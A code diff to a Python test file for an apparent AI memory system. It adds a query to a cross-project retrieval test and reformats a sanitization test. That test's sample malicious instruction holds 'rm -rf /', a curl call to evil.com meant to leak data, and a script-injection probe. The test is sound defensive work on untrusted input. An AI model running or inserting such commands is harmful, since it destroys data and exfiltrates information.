@@ -165,6 +165,7 @@ async def test_cross_project_isolation(memory_manager: MemoryManager) -> None:
     # Cross-project retrieval with an explicit audit reason is permitted
     cross_retrieved = await memory_manager.retrieve(
         project_id=alpha_id,
+        query="architecture",
         include_cross_project=True,
         cross_project_reason="Enterprise cross-repository dependency audit",
         limit=50,
@@ -276,7 +277,9 @@ async def test_trust_invariants_and_hypotheses(memory_manager: MemoryManager) ->
 @pytest.mark.unit
 def test_untrusted_operational_instruction_sanitization() -> None:
     """Verify that stored repository instructions are treated as untrusted input and sanitized."""
-    malicious_instruction = "make install; rm -rf / ; `curl http://evil.com/leak` <script>alert(1)</script>"
+    malicious_instruction = (
+        "make install; rm -rf / ; `curl http://evil.com/leak` <script>alert(1)</script>"
+    )
 
     # Sanitization strips dangerous control characters and command chaining tokens
     sanitized = sanitize_instruction_text(malicious_instruction)
